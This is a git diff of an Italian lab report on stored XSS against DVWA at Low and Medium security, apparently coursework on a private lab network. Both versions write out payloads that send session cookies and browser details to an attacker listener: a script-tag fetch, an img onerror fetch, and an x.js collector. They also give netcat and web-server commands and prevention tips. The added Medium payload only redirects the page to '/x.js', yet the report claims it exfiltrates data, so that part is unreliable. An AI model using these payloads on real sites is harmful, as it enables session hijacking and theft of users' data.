@@ -163,122 +163,126 @@ Seguendo questa guida, abbiamo dimostrato come eseguire una SQL Injection su DVW
 
 # 🛡 **TRACCIA GIORNO 2: Exploit XSS Persistente su DVWA (Low e Medium)**
 
-Questa guida illustra come sfruttare una vulnerabilità di **Cross-Site Scripting (XSS) Persistente** sulla piattaforma **DVWA (Damn Vulnerable Web Application)** in modalità **Low** e **Medium**. L'obiettivo è simulare il furto di cookie di sessione inviandoli a un server sotto il nostro controllo.
+Questa guida documenta l'esecuzione di attacchi **Stored XSS** sulla piattaforma **DVWA** nei livelli di sicurezza **Low** e **Medium**. Verranno utilizzati payload compatti e tecniche per raccogliere informazioni sensibili, simulando un furto di dati.
 
-## **Requisiti**
+---
 
-1. **DVWA Installato** e configurato.
-2. **Livelli di Sicurezza** impostati su **Low** e **Medium**.
-3. **Server di Ascolto** su Kali Linux configurato per ricevere i cookie sulla porta **4444**.
-4. Indirizzi IP:
-   - **Kali Linux**: `192.168.50.165`
-   - **Metasploitable**: `192.168.50.3`
+## Prerequisiti
+1. **Ambiente configurato**:
+   - **Kali Linux**: 192.168.50.165
+   - **Metasploitable con DVWA**: 192.168.50.3
+2. **DVWA configurato**:
+   - Livelli di sicurezza impostati su **Low** e successivamente su **Medium**.
+   - Database correttamente configurato.
 
-## 🔍 **Parte 1: XSS Persistente in Modalità Low**
+---
 
-### 🎯 **Obiettivo**
-Iniettare uno script malevolo nella web application DVWA per inviare i cookie della sessione al nostro server di ascolto.
+## Struttura della guida
+- **Attacco al livello Low**: utilizzo di un payload diretto.
+- **Attacco al livello Medium**: utilizzo di un payload compatto con file remoto.
+- **Dump di dati**: raccolta di cookie, user agent e altre informazioni.
+- **Screenshot**: dimostrazione dei passaggi chiave.
 
-### 📝 **Passaggi**
+---
 
-1. **Configura il Server di Ascolto su Kali Linux**:
-   - Avvia Netcat per ricevere i cookie sulla porta 4444:
-     ```bash
-     nc -lvnp 4444
-     ```
+## Attacco XSS Stored - Livello Low
 
-2. **Accedi a DVWA**:
-   - Vai alla sezione **XSS Persistente**:
-     ```
-     http://192.168.50.3/dvwa/vulnerabilities/xss_r/
-     ```
+### **Step 1: Preparazione**
+1. Configura un web server su Kali Linux per ospitare il file `x.js`:
+   ```bash
+   python3 -m http.server 80
+   ```
+2. Crea il file `x.js` con il seguente contenuto:
+   ```javascript
+   // Raccogli tutte le informazioni disponibili
+   let data = {
+       cookies: document.cookie,
+       userAgent: navigator.userAgent,
+       language: navigator.language,
+       platform: navigator.platform,
+       screenResolution: `${screen.width}x${screen.height}`,
+       windowSize: `${window.innerWidth}x${window.innerHeight}`,
+       referrer: document.referrer,
+       url: document.location.href,
+       timestamp: new Date().toISOString()
+   };
 
-3. **Inserisci il Payload**:
-   Usa il seguente script JavaScript nel campo vulnerabile (esempio: un campo commento):
-   ```html
-   <script>
-     fetch('http://192.168.50.165:4444', {
+   // Invia i dati raccolti al server
+   fetch('http://192.168.50.165:4444/', {
        method: 'POST',
-       body: document.cookie
-     });
-   </script>
+       headers: { 'Content-Type': 'application/json' },
+       body: JSON.stringify(data)
+   });
    ```
 
-4. **Esegui il Payload**:
-   - Invia il payload premendo **Submit**.
-   - Ogni volta che la pagina viene caricata, lo script invierà i cookie della sessione al server di ascolto.
+### **Step 2: Inserimento Payload**
+Inserisci il seguente payload nel campo **Message** di DVWA:
+```html
+<script src="http://192.168.50.165/x.js"></script>
+```
 
-5. **Verifica i Cookie su Kali Linux**:
-   - Sul terminale di Kali Linux, dovresti vedere i cookie della sessione, ad esempio:
-     ```
-     PHPSESSID=abcdef1234567890; security=low
-     ```
-![XSSLow](./Screenshots/XSSLow.png)
+### **Step 3: Avvia il Listener**
+Configura un listener su Kali per ricevere i dati:
+```bash
+sudo nc -lvnp 4444
+```
 
+### **Step 4: Risultati**
+Quando il commento viene visualizzato, i dati raccolti dal file `x.js` vengono inviati al listener.
 
-## 🔍 **Parte 2: XSS Persistente in Modalità Medium**
+![XSS Stored Low](./Screenshots/XSSStoredLow.png)
 
-### 🎯 **Obiettivo**
-Aggirare i filtri di input e sfruttare la vulnerabilità XSS per ottenere i cookie della sessione.
+---
 
-### 📝 **Passaggi**
+## Attacco XSS Stored - Livello Medium
 
-1. **Configura il Server di Ascolto su Kali Linux**:
-   - Utilizza lo stesso comando di Netcat:
-     ```bash
-     nc -lvnp 4444
-     ```
-
-2. **Accedi a DVWA**:
-   - Vai alla sezione **XSS Persistente**:
-     ```
-     http://192.168.50.3/dvwa/vulnerabilities/xss_r/
-     ```
-
-3. **Inserisci il Payload Alternativo**:
-   Poiché `<script>` potrebbe essere filtrato, utilizza il seguente payload:
-   ```html
-   <img src="nonexistent.jpg" onerror="fetch('http://192.168.50.165:4444', {method: 'POST', body: document.cookie})">
+### **Step 1: Preparazione**
+1. Configura il server web e utilizza lo stesso file `x.js` preparato per il livello Low.
+2. Avvia il server web:
+   ```bash
+   python3 -m http.server 80
    ```
 
-4. **Esegui il Payload**:
-   - Invia il payload premendo **Submit**.
-   - Ogni volta che un utente carica la pagina, l'evento `onerror` si attiverà e invierà i cookie al server di ascolto.
+### **Step 2: Inserimento Payload**
+Poiché il livello Medium ha restrizioni di lunghezza, utilizza un payload compatto:
+```html
+<img src=x onerror="location='/x.js'">
+```
 
-5. **Verifica i Cookie su Kali Linux**:
-   - Controlla il terminale e verifica i cookie ricevuti:
-     ```
-     PHPSESSID=abcdef1234567890; security=medium
-     ```
+### **Step 3: Avvia il Listener**
+Configura un listener su Kali per ricevere i dati:
+```bash
+sudo nc -lvnp 4444
+```
 
-![XSSMedium](./Screenshots/XSSMedium.png)
+### **Step 4: Risultati**
+Quando il commento viene visualizzato, il file `x.js` viene caricato e i dati raccolti vengono inviati al listener.
 
-## 📌 **Spiegazione dei Payload**
+![XSS Stored Medium](./Screenshots/XSSStoredMedium.png)
 
-### **Payload in Modalità Low**
-- `<script>`: Inietta uno script JavaScript nella pagina vulnerabile.
-- `document.cookie`: Recupera i cookie della sessione della vittima.
-- `fetch`: Invia i cookie al server dell'attaccante tramite una richiesta HTTP POST.
+---
 
-### **Payload in Modalità Medium**
-- `<img src="nonexistent.jpg">`: Un'immagine che non esiste attiva l'evento `onerror`.
-- `onerror`: Contiene lo script malevolo per inviare i cookie.
-- `fetch`: Come sopra, invia i cookie al server.
+## Dati Raccolti
+Il file `x.js` raccoglie le seguenti informazioni:
+- **Cookies**: sessioni dell'utente.
+- **User Agent**: browser e sistema operativo.
+- **Lingua del Browser**.
+- **Piattaforma**: sistema operativo.
+- **Risoluzione dello schermo**.
+- **Dimensioni della finestra**.
+- **Referrer**: URL della pagina precedente.
+- **URL corrente**.
+- **Timestamp**: data e ora dell'attacco.
 
-## 🛡 **Considerazioni di Sicurezza**
+---
 
-Per proteggere le applicazioni da attacchi XSS:
+## Misure di Prevenzione
+1. **HttpOnly Cookies**: Protegge i cookie dall'accesso tramite JavaScript.
+2. **Validazione Input**: Sanitize sia lato client che lato server.
+3. **Content Security Policy (CSP)**: Limita l'esecuzione di script non autorizzati.
+4. **Escape HTML Output**: Evita l'inserimento di script.
 
-1. **Sanitizzazione dell'Input**:
-   - Filtra e valida tutti i dati forniti dagli utenti per evitare l'iniezione di codice malevolo.
-2. **Cookie HTTPOnly**:
-   - Imposta i cookie di sessione come **HTTPOnly** per impedire l'accesso tramite JavaScript.
-3. **Content Security Policy (CSP)**:
-   - Configura una CSP per limitare l'esecuzione di script non autorizzati.
-
-## 🚀 **Conclusione**
-
-Abbiamo dimostrato come sfruttare vulnerabilità di **SQL Injection** e **XSS Persistente** su DVWA per estrarre dati sensibili e rubare cookie di sessione. Questa guida sottolinea l'importanza di implementare misure di sicurezza per prevenire tali attacchi.
+---
 
 ## [Torna in cima](#-s8-build-week-2-report-operativo--cybercerberus).
 
